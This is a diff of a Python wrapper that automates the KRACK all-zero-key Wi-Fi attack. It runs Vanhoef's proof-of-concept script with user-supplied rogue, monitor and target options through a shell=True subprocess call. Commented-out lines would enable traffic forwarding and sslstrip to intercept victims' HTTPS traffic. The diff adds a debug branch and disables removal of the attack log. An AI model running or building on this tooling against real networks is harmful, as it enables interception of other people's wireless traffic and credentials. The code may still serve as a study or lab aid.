@@ -132,20 +132,27 @@ def main():
                 # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
-                #subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
+                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code.
+ 	
+		# TODO these must be activated, otherwise user must run these commands manually
+                #subprocess.call(["./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh &"])
                 #subprocess.call(["sslstrip -w sslstrip.log &"])
-            	attackParser()
+	
+		# User will only see relevant output, unless debug is on
+		if options.debug:
+			print("Debug enabled")
+		else:            	
+			attackParser()
 
         except KeyboardInterrupt:
    	    subprocess.call(["clear"], shell=True)
             log.info("Cleaning up and restoring wifi ...")
-	    subprocess.call(["rm attackOutput.txt"], shell=True)
+	    #subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 	except:
 	    subprocess.call(["clear"], shell=True)
             log.info("Error occurred. Restoring wifi ...")
-            subprocess.call(["rm attackOutput.txt"], shell=True)
+            #subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 
     ############# RESTORE INTERNET ################        
